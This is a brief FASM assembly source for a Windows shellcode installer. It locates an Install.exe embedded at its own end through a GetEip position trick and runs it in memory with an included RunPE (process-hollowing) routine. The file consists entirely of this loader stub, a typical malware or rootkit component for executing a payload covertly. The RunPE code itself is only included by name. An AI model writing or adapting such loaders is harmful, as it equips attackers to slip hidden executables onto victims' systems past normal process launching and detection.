format PE GUI 4.0
entry Main

include 'win32wx.inc'
include 'nt.inc'
include 'PebApi.inc'

section '.text' code readable executable

; This is the shellcode installer - compiled to "Install.shellcode"

proc Main
	; Get offset to InstallExe, where Install.exe is stored
	stdcall	GetEip
	lea		eax, [eax - Main + InstallExe]

	; RunPE Install.exe
	stdcall	RunPE, eax

	ret
endp

proc GetEip
	mov		eax, [esp]
	sub		eax, 5
	ret
endp

include 'PebApi.asm'
include 'RunPE.asm'

InstallExe:
; Install.exe will be stored here, after final compilation stage completed.